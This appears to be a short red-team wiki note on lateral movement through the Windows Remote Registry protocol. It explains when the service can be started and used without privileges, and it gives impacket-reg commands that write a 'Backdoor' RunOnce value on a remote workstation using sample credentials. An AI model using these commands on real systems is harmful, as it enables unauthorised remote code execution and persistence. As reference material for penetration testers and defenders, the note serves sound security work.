---
title: Lateral Movement with Remote Registry
---

[[notes/lateral-movement/index]] by using [MS-RRP](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rrp/) to modify the [[notes/windows/registry]], e.g. write to one of the [Run keys](https://persistence-info.github.io/Data/run.html).

By default the remote registry service starts on demand on servers and is disabled on desktops since Windows 10.
If the service is not disabled the start can be triggered as unprivileged user ([source](https://twitter.com/splinter_code/status/1715876413474025704)).
Otherwise you will get *OBJECT_NAME_NOT_FOUND* and need local admin rights to reenable it.

Once the service is running it is possible to read and write the HKCU hive as unprivileged user ([source](https://twitter.com/splinter_code/status/1717706003322478986)), but only if the target user is currently logged in on the target computer ([source](https://twitter.com/0x64616e/status/1722386415227412522)).
Otherwise you will get *FILE_NOT_FOUND*.

=== "[[notes/tools/impacket]]"
    ~~~ bash
    impacket-reg jdoe:'passw0rd'@ws01.corp.local query -keyName 'HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce'
    impacket-reg jdoe:'passw0rd'@ws01.corp.local add -keyName 'HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce' -v Backdoor -vt REG_SZ -vd 'calc.exe'
    ~~~
